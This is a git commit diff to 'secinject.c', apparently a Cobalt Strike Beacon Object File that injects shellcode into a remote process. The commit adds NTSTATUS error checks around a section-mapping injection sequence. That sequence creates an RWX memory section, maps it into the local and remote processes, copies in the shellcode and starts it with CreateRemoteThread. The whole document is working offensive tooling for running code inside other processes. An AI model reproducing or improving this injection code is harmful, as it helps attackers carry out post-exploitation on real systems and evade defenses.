10f2315298053eec75423cfe6e69424d5722ff70
apokryptein <bennett.tomlinson@gmail.com>
2021-12-28 10:47:32 -0500

    Added NTSTATUS error checking

--- src/secinject.c
+++ src/secinject.c
@@ -3,6 +3,8 @@
 #include "beacon.h"
 #include "libc.h"
 
+#define NT_SUCCESS 0x00000000
+
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
 NTSYSAPI NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
@@ -42,11 +44,26 @@ void go(char * args, int len) {
     // Create RWX memory section
     NTSTATUS res = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
+    if(res != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error creating RWX memory section  Aborting...");
+        return;
+    }
+    
     // Map RW Section of Local Process
     NTSTATUS mapStatusLocal = NTDLL$NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &shellcodeSize, 2, 0, PAGE_READWRITE);
 
+    if(mapStatusLocal != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping local process  Aborting...");
+        return;
+    }
+
     // Map view of same section for remote process
     NTSTATUS mapStatusRemote = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &shellcodeSize, 2, 0, PAGE_EXECUTE_READ);
+
+    if(mapStatusRemote != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping remote process.  Aborting...");
+        return;
+    }    
 
     // Copy buffer to mapped local process
     mycopy(baseAddrLocal, shellcode, shellcodeSize);
@@ -54,8 +71,16 @@ void go(char * args, int len) {
     // Unmap local view
     NTSTATUS unmapStatus = NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
 
+    if(unmapStatus != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error unmapping view");
+    }    
+
     // Close section
     NTSTATUS closeStatus = NTDLL$NtClose(hSection);
+
+    if(closeStatus != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error closing handle");
+    } 
 
     // Create thread
     HANDLE hThread = KERNEL32$CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE) baseAddrRemote, NULL, 0, NULL);
